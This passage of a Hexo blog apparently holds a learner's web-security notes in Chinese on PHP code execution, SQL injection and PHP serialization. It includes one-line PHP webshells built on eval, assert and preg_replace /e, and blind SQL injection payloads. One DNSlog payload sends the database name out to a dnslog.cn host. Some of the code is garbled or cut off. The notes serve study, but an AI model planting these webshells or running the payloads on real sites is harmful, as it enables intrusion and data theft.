<li><p>assert不需要分号，一句话木马啥的都行&lt;?php @eval($_POST[‘CMD’])不要加分号？&gt;</p>
</li>
<li><p>preg_replace(“&#x2F;test&#x2F;e”,$_POST[‘’‘CMD’],”JUST TEST”)在just test里面寻找test把他替换成cmd，然后当作php命令来执行</p>
</li>
<li><p>array_filter($array,$func)&#x2F;&#x2F;前面数组&#x3D;&#x3D;参数，&#x3D;&#x3D;后边&#x3D;&#x3D;函数&#x3D;&#x3D;，</p>
</li>
<li><p>array_map（‘函数’，‘数组’）</p>
<p>这里有一个简单的 PHP 示例，演示了如何使用 <code>array_map</code>：</p>
<p>php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">解释<span class="function"><span class="keyword">function</span> <span class="title">square</span>(<span class="params"><span class="variable">$x</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$x</span> * <span class="variable">$x</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$numbers</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"><span class="variable">$squaredNumbers</span> = <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;square&#x27;</span>, <span class="variable">$numbers</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$squaredNumbers</span>);</span><br></pre></td></tr></table></figure>

<p>输出将是：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">解释Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; 1</span><br><span class="line">    [1] =&gt; 4</span><br><span class="line">    [2] =&gt; 9</span><br><span class="line">    [3] =&gt; 16</span><br><span class="line">    [4] =&gt; 25</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>在这个例子中，<code>square</code> 函数被用作回调函数，它将每个元素的值平方，然后 <code>array_map</code> 将这个函数应用于 <code>$numbers</code> 数组中的每个元素。</p>
</li>
<li><p>creat_function(‘’,’$a)&#x2F;&#x2F;前面作为参数传递给后边函数</p>
</li>
<li><pre><code class="php">$add = create_function(&#39;$a,$b&#39;, &#39;return $a + $b;&#39;);

echo $add(5, 3); // 输出 8
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ call_user_func(“assert”,$_POST[‘CMD’]);前面函数后面参数</span><br><span class="line"></span><br><span class="line">+ 双引号</span><br><span class="line">  如果是双引号，解释器会把变量内容解析出来</span><br><span class="line"></span><br></pre></td></tr></table></figure>
echo “phpinfo()”//不会执行
echo &quot;$a&quot;//$a=phpinfo()/会执行
echo &#39;$a&#39;//单引号不执行
</code></pre>
</li>
</ul>
<h3 id="不可靠的反序列化"><a href="#不可靠的反序列化" class="headerlink" title="不可靠的反序列化"></a>不可靠的反序列化</h3>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/10/08/top10/8rce/" data-id="cm1zvswpz000frkasec8e07ub" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-top10/9sql注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/10/08/top10/9sql%E6%B3%A8%E5%85%A5/" class="article-date">
  <time class="dt-published" datetime="2024-10-08T02:40:41.317Z" itemprop="datePublished">2024-10-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>输入恶意，对数据库进行操作，增删改查</p>
<h1 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h1><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><ul>
<li><p>bool盲注<br>回显内容不同作为判断依据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=1 and 1=1</span><br><span class="line">id=2 and 1=2</span><br><span class="line">id=1 and user()=&#x27;root@localhost&#x27;</span><br></pre></td></tr></table></figure>
</li>
<li><p>时间盲注<br>回显时间不同作为判断</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=1 and sleep(2)</span><br><span class="line">id=1 and if((substr((select user()),1,1)=&#x27;r&#x27;),sleep(2),1)</span><br></pre></td></tr></table></figure>
</li>
<li><p>dnslog盲注<br>对方服务器必须windws，root权限，secure_file_priv为空</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=2 and 1=(selectload_file(concat(&#x27;\\\&#x27;,hex(database()),&#x27;.rly7j0.dnslog.cn</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>用数据库的机制人为制造错误条件，查询结果回显到报错信息中</p>
<ul>
<li>floor<br>利用数据库主键不能重复，group by分组，产生主键冗余，报错</li>
<li>updatexm</li>
<li>extractvalue</li>
</ul>
<h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>对于ascii码这样的单字节而言，GB2312 GBK就是宽字节，实际上只有两个字节</p>
<ul>
<li>gbk是多字符编码方式，gbk编码的汉字占两个字节，utf-8编码的占3个</li>
<li>mysql为应对这种注入，引入转义函数的机制，如对特殊字符加上反斜杠进行转义，</li>
<li>以php客户端为例，用户输入时，若php没有进行编码修改，则会通过默认的编码方式来生成sql语句，传递给服务器，php没有开启default_charse时，编码方式默认为空</li>
<li>数据库收到编码信息后对sql语句解码，再用系统变量character_set_connection进行十六进制编码，当sql语句执行完，通过character_set_results进行编码输出</li>
</ul>
<p>mysql数据库在使用宽字符（gbk）编码时，默认两个字符一个汉字，当客户端输入单引号时，mysql会调用转义函数，将‘转变为\，\的十六进制是%5c，mysql的gbk编码会认为%d%5c是一个宽字节，从而使单引号闭合</p>
<h1 id="sql注入bypass"><a href="#sql注入bypass" class="headerlink" title="sql注入bypass"></a>sql注入bypass</h1>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/10/08/top10/9sql%E6%B3%A8%E5%85%A5/" data-id="cm1zvswq4000prkas8zix4caf" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-top10/7序列化" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/10/08/top10/7%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date">
  <time class="dt-published" datetime="2024-10-08T02:40:41.315Z" itemprop="datePublished">2024-10-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h1><h3 id="a-unserialize-serialize-‘system-‘ls’-’-这样的话ls会执行吗"><a href="#a-unserialize-serialize-‘system-‘ls’-’-这样的话ls会执行吗" class="headerlink" title="$a&#x3D;unserialize(serialize(‘system(‘ls’)’)),这样的话ls会执行吗"></a>$a&#x3D;unserialize(serialize(‘system(‘ls’)’)),这样的话ls会执行吗</h3><pre><code>●	serialize函数只是对字符串值&#39;system(\&#39;ls\&#39;)&#39;进行序列化，它并不知道这个字符串里面包含的是可执行的命令相关内容。unserialize也仅仅是将序列化后的字符串再还原回原来的字符串。

●	在 PHP 中，一个字符串并不会自动被识别并执行其中可能包含的命令。要执行系统命令，必须明确地调用执行系统命令的函数（如system、exec、shell_exec等）。

2.	执行机制的不同

●	当你直接写$a = system(&#39;ls&#39;);时，PHP 会识别system是一个执行系统命令的函数，并尝试执行括号内的ls命令。

●	而在$a = unserialize(serialize(&#39;system(\&#39;ls\&#39;)&#39;));中，整个过程只是对字符串的序列化和反序列化操作，不会触发系统命令的执行机制。
</code></pre>
<p>所以，在执行完$a &#x3D; unserialize(serialize(‘system(&#39;ls&#39;)’));后，$a的值为system(‘ls’)（这是一个字符串），而不是执行system(‘ls’)这个命令后的结果。</p>
<h3 id="unserialize之后的内容全是字符串吗"><a href="#unserialize之后的内容全是字符串吗" class="headerlink" title="unserialize之后的内容全是字符串吗"></a>unserialize之后的内容全是字符串吗</h3><p>数组，对象，字符串各回各家</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/10/08/top10/7%E5%BA%8F%E5%88%97%E5%8C%96/" data-id="cm1zvswpz000grkas4zeqcmxa" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%88%91%E6%9C%8D%E4%BA%86%EF%BC%8C%E5%88%B0%E5%BA%95%E4%B8%BA%E4%BB%80%E4%B9%88%E6%B2%A1%E6%9C%89css/" rel="tag">我服了，到底为什么没有css</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/%E6%88%91%E6%9C%8D%E4%BA%86%EF%BC%8C%E5%88%B0%E5%BA%95%E4%B8%BA%E4%BB%80%E4%B9%88%E6%B2%A1%E6%9C%89css/" style="font-size: 10px;">我服了，到底为什么没有css</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/10/">October 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/07/">July 2024</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2024/10/08/top10/%E6%88%91%E9%82%A3%E6%87%B5%E9%80%BC%E7%9A%84%E9%97%AE%E9%A2%98%E4%BB%AC/">(no title)</a>
          </li>
        
          <li>
            <a href="/2024/10/08/top10/%E5%87%BD%E6%95%B0/">(no title)</a>
          </li>
        
          <li>
            <a href="/2024/10/08/top10/SQL/">(no title)</a>
          </li>
        
          <li>
            <a href="/2024/10/08/top10/md5%E7%BB%95%E8%BF%87/">(no title)</a>
          </li>
        
          <li>
            <a href="/2024/10/08/top10/shctf/">(no title)</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2024 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>